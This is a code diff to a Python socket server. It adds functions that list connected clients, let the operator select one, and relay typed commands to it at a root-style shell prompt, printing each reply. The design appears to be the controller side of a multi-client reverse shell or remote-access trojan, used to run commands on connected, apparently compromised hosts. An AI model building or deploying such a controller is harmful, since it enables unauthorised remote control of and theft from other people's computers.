@@ -33,3 +33,27 @@ class Server:
             print(f"New connection from {client_address[0]}")
             with self.lock:
                 self.clients.append((client_socket, client_address))
+
+    # Implement client interaction functions
+    def select_client(self):
+        print("Available clients:")
+        for index, (_, addr) in enumerate(self.clients):
+            print(f"[{index}]-> {addr[0]}")
+
+        index = int(input("Select a client by index: "))
+        self.current_client = self.clients[index]
+
+    def handle_client(self):
+        client_socket, client_address = self.current_client
+        while True:
+            command = input(f"{client_address[0]}:~# ")
+            if command == '!ch':
+                break
+            if command == '!q':
+                self.exit_flag = True
+                print("Exiting server...")
+                break
+
+            client_socket.send(command.encode('utf-8'))
+            response = client_socket.recv(1024)
+            print(response.decode('utf-8'))
